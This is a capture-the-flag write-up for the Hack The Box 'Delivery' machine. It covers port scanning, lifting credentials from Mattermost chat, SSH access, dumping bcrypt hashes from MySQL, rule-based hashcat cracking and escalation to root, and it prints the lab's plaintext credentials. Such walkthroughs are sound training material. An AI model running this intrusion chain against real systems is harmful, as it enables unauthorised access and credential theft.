# Delivery

# Delivery – Hack The Box Write-up 

> **Machine:** Delivery
> **Platform:** Hack The Box
> **Difficulty:** Easy
> **Focus Areas:** Web Enumeration, Credential Reuse, Configuration Analysis, Hash Cracking (bcrypt), Privilege Escalation

---

## 1. Reconnaissance & Enumeration

The initial phase focused on full TCP port discovery followed by targeted service enumeration.

```bash
nmap -Pn -n -p- --min-rate 5000 -T4 <IP>
nmap -p22,80,8065 -sSCV --min-rate 5000 -T4 <IP>
```

### Discovered Services

* **22/tcp** → SSH
* **80/tcp** → HTTP
* **8065/tcp** → Mattermost

The presence of Mattermost suggested potential credential exposure or misconfiguration exploitation.

---

## 2. Web Access & Initial Foothold

Before accessing the web service, the domain needed to be resolved locally:

```bash
sudo nano /etc/hosts
```

The target domain was added manually to allow proper interaction with the application.

### Ticket Creation & Mattermost Access

The web application required creating a support ticket. After doing so, a confirmation email allowed registration into **Mattermost** running on port 8065.

By accessing internal chat channels, exposed credentials were discovered:

```
maildeliverer:Youve_G0tMail!
```

---

## 3. Initial Access – SSH

Since SSH was exposed, credential reuse was tested:

```bash
ssh maildeliverer@delivery.htb
```

Authentication was successful, providing a low-privileged shell.

User flag retrieval:

```bash
ls
cat user.txt
```

---

## 4. Mattermost Configuration Analysis

Next step was local enumeration for sensitive configuration files.

```bash
find / -name mattermost 2>/dev/null
cd /opt/mattermost/config
cat config.json
```

The `config.json` file revealed database credentials:

* **User:** mmuser
* **Database:** mattermost

---

## 5. Database Access & Hash Extraction

Using the recovered credentials:

```bash
mysql -u mmuser -p
```

Inside MySQL:

```sql
use mattermost;
select * from Users;
```

The query returned stored bcrypt password hashes, including the **root Mattermost user**.

---

## 6. Password Cracking (bcrypt – Hashcat)

A chat message hinted that the base password was:

```
PleaseSubscribe!
```

However, it was modified using **rules**.

### Preparing Attack Files (Local Machine)

```bash
echo "PleaseSubscribe!" > password.txt
echo '$2a$10$XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX' > hash.txt
```

> Important: Keep the hash between single quotes to avoid shell interpretation issues.

### Hashcat Execution

```bash
hashcat -m 3200 hash.txt password.txt -r /usr/share/hashcat/rules/best64.rule
```

**Explanation:**

* `-m 3200` → bcrypt
* `best64.rule` → Applies common mutations (capitalization, symbol addition, numeric substitutions)

To display cracked credentials:

```bash
hashcat -m 3200 hash.txt password.txt --show
```

The password was successfully recovered after rule mutation.

---

## 7. Privilege Escalation

With the cracked password, privilege escalation was straightforward:

```bash
su root
```

Root flag retrieval:

```bash
cd /root
cat root.txt
```

---

# Technical Assessment & Skills Demonstrated

This machine highlights key offensive security competencies:

### ✔ Service Enumeration & Attack Surface Mapping

Systematic identification of exposed services and prioritization based on attack potential.

### ✔ Credential Reuse Exploitation

Testing discovered credentials across multiple services (SSH).

### ✔ Sensitive File Discovery

Manual enumeration and analysis of application configuration files.

### ✔ Database Exploitation

Direct interaction with MySQL to extract sensitive authentication data.

### ✔ Hash Cracking with Rule-Based Attacks

Efficient use of Hashcat rules to mutate base passwords and crack bcrypt hashes.

### ✔ Privilege Escalation via Credential Recovery

Leveraging cracked credentials to escalate to root.

---

# Key Takeaways

* Internal communication platforms often leak operational credentials.
* Configuration files remain a high-value target post-compromise.
* Even strong hashing algorithms like bcrypt remain vulnerable to weak password strategies.
* Rule-based cracking significantly reduces brute-force time when hints are available.



